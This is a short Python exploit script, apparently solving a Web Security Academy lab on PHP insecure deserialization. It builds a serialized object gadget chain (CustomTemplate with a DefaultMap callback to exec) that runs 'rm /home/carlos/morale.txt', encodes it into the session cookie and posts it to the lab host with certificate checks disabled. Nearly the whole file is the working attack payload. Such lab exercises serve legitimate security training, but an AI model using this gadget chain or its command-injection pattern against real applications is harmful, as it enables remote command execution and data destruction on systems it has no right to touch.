import subprocess
import urllib.parse
import requests
import base64
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

access_token = r'O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}'
serial_base64_encode = base64.b64encode(bytes(access_token, encoding="utf-8"))
serial_url_encode = urllib.parse.quote_plus(serial_base64_encode)
headers = {"cookie": "session="+serial_url_encode}

#exploit

r = requests.post("https://0af000680416db21c044487d007200bf.web-security-academy.net/", headers=headers, allow_redirects=False, verify=False)
if "Congratulations, you solved the lab!" in r.content.decode():
    print("Lab has been solved")